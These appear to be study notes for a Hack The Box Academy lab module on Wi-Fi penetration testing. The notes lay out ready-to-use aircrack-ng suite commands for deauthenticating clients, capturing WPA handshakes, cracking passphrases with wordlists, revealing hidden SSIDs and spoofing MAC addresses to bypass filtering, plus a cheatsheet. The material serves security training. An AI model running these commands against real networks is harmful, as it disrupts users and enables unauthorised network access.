# HTB Academy — Wi-Fi Penetration Testing Basics

> **Platform:** Hack The Box Academy
> **Difficulty:** Medium
> **Badge:** 🏅 Air Warrior
> **Reward:** +20 Cubes
> **Sections:** 16
> **Path:** Wi-Fi Penetration Tester Job Role Path

---

## 📖 Module Overview

This module introduces the fundamental techniques for enumerating, visualizing, and attacking Wi-Fi networks. Topics include how to enumerate and map access points, exploit vulnerabilities in Wi-Fi networks, discover hidden networks, and bypass MAC filtering using the `aircrack-ng` suite.

> No physical WiFi hardware is required — HTB provides a remote attacker VM accessible via RDP.

---

## ✅ Prerequisites

- Working knowledge of Linux systems
- Network fundamentals (OSI model, IP addressing, subnetting)
- Basic familiarity with the terminal and bash

---

## 🗂️ Topics Covered

### 1. Introduction to Wi-Fi Pentesting
Overview of what WiFi penetration testing involves and why it matters. The four pillars of a WiFi pentest:

- **Evaluating Passphrases** — dictionary attacks, brute force, password cracking
- **Evaluating Configuration** — encryption protocols, auth methods, network segmentation
- **Testing Infrastructure** — architecture weaknesses, firmware flaws, device misconfigs
- **Testing Client Devices** — vulnerabilities on devices connecting to the network

---

### 2. WiFi Authentication Standards

| Standard | Encryption | Notes |
|---|---|---|
| WEP | RC4 (TKIP) | Outdated, easily cracked |
| WPA | TKIP | Interim fix over WEP, still weak |
| WPA2 | AES/CCMP | Current standard, PSK & Enterprise modes |
| WPA3 | SAE | Latest, stronger password auth, harder to crack |

---

### 3. Monitor Mode & Wireless Interface Setup

Enable monitor mode to passively capture all wireless traffic in range:

```bash
sudo airmon-ng check kill          # Kill interfering processes
sudo airmon-ng start wlan0         # Enable monitor mode → wlan0mon
iwconfig                           # Verify mode
```

Disable monitor mode:
```bash
sudo airmon-ng stop wlan0mon
```

---

### 4. Enumeration with airodump-ng

Scan for nearby access points and clients:

```bash
sudo airodump-ng wlan0mon
```

Filter by channel or BSSID:
```bash
sudo airodump-ng --channel 6 wlan0mon
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

**Output fields:**

| Field | Meaning |
|---|---|
| BSSID | MAC address of the AP |
| PWR | Signal strength |
| Beacons | Broadcast frames sent |
| #Data | Data frames captured |
| CH | Channel |
| ENC | Encryption type |
| ESSID | Network name |
| STATION | Connected client MAC |

---

### 5. Discovering Hidden Networks

Hidden SSIDs don't broadcast their name but still appear in airodump-ng with `<length: N>`. To reveal them, capture a deauthentication + reassociation:

```bash
# Force client to reconnect, revealing the SSID
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

Then watch airodump-ng — the SSID will be revealed in the probe response.

---

### 6. MAC Filtering Bypass

Some APs only allow connections from known MAC addresses. Bypass by spoofing a whitelisted MAC:

```bash
sudo airmon-ng stop wlan0mon
sudo ifconfig wlan0 down
sudo macchanger wlan0 -m <TARGET_MAC>
sudo ifconfig wlan0 up
ifconfig wlan0                     # Verify spoofed MAC
```

---

### 7. Connecting to Wi-Fi Networks (CLI)

**Step 1 — Create WPA config:**
```bash
nano wpa.conf
```
```
network={
    ssid="NetworkName"
    psk="password"
    scan_ssid=1
    key_mgmt=WPA-PSK
}
```

**Step 2 — Authenticate:**
```bash
sudo wpa_supplicant -B -c wpa.conf -i wlan0
```

**Step 3 — Get IP via DHCP:**
```bash
sudo dhclient wlan0
```

**Step 4 — Verify connection:**
```bash
ifconfig wlan0
ip route
```

---

### 8. Retrieving Flags / Web Resources

Once connected, retrieve content from the target IP:

```bash
wget -qO- http://192.168.1.1
wget -qO- http://192.168.2.1

# If wget unavailable:
python3 -c "import urllib.request; print(urllib.request.urlopen('http://192.168.1.1').read().decode())"
```

---

### 9. Packet Capture & Analysis

Capture traffic for a specific AP to a file:

```bash
sudo airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan0mon
```

This produces `capture-01.cap` which can be opened in Wireshark or used for cracking.

---

### 10. Deauthentication Attacks

Forcibly disconnect clients from an AP (useful to capture WPA handshakes):

```bash
sudo aireplay-ng --deauth 0 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
```

> `0` = continuous deauth. Use a small number like `10` to be less aggressive.

---

### 11. WPA Handshake Capture

1. Start capturing on the target channel:
```bash
sudo airodump-ng --bssid <BSSID> --channel <CH> -w handshake wlan0mon
```

2. In another terminal, deauth a client:
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

3. Wait for `WPA handshake: <BSSID>` to appear in airodump-ng output.

---

### 12. Password Cracking with aircrack-ng

Once a handshake is captured:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> handshake-01.cap
```

With hashcat (faster, GPU):
```bash
# Convert cap to hccapx
cap2hccapx handshake-01.cap handshake.hccapx

# Crack
hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
```

---

## 🛠️ Tools Reference

| Tool | Purpose |
|---|---|
| `airmon-ng` | Enable / disable monitor mode |
| `airodump-ng` | Passive network scanning and packet capture |
| `aireplay-ng` | Inject packets — deauth, fake auth, etc. |
| `aircrack-ng` | WPA/WEP password cracking from .cap files |
| `macchanger` | Spoof or randomize MAC address |
| `wpa_supplicant` | WPA/WPA2 authentication daemon |
| `dhclient` | DHCP IP address assignment |
| `iwconfig` | View / configure wireless interfaces |
| `hashcat` | GPU-accelerated password cracking |
| `Wireshark` | GUI packet analysis |

---

## 🧪 Skills Assessment

The final skills assessment combines all techniques from the module:

1. Scan for available networks with `airodump-ng`
2. Identify the target AP (SSID, BSSID, channel, encryption)
3. Capture a WPA handshake via deauth attack
4. Crack the password with `aircrack-ng` / `hashcat`
5. Spoof MAC if MAC filtering is enabled
6. Connect using `wpa_supplicant` + `dhclient`
7. Retrieve the flag at `192.168.1.1` or `192.168.2.1`

---

## 🗺️ Attack Flow

```
Monitor Mode
     ↓
airodump-ng (enumerate APs + clients)
     ↓
Identify Target AP
     ↓
Capture WPA Handshake (deauth → reassoc)
     ↓
Crack Password (aircrack-ng / hashcat)
     ↓
MAC Spoof (if MAC filtering enabled)
     ↓
wpa_supplicant (authenticate)
     ↓
dhclient (get IP)
     ↓
wget / python3 → GET FLAG
```

---

## 📝 Key Commands Cheatsheet

```bash
# Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Enumerate
sudo airodump-ng wlan0mon

# Capture handshake
sudo airodump-ng --bssid <BSSID> -c <CH> -w capture wlan0mon
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon

# Crack
aircrack-ng -w rockyou.txt -b <BSSID> capture-01.cap

# MAC spoof
sudo ifconfig wlan0 down
sudo macchanger -m <MAC> wlan0
sudo ifconfig wlan0 up

# Connect
sudo wpa_supplicant -B -c wpa.conf -i wlan0
sudo dhclient wlan0

# Get flag
wget -qO- http://192.168.1.1
```

---

## 🔗 Related Modules

- **Attacking WPA/WPA2 Wi-Fi Networks** — deeper dives into WPA-Personal & WPA-Enterprise attack vectors
- **Wi-Fi Penetration Testing Tools & Techniques** — broader tool coverage beyond aircrack-ng
- **Wi-Fi Password Attacks** — advanced cracking techniques and optimizations
- **Attacking Corporate Wi-Fi Networks** — capstone module with full simulated engagement

---

*HTB Academy · Wi-Fi Penetration Testing Basics · Badge: Air Warrior*


![[badge.png]]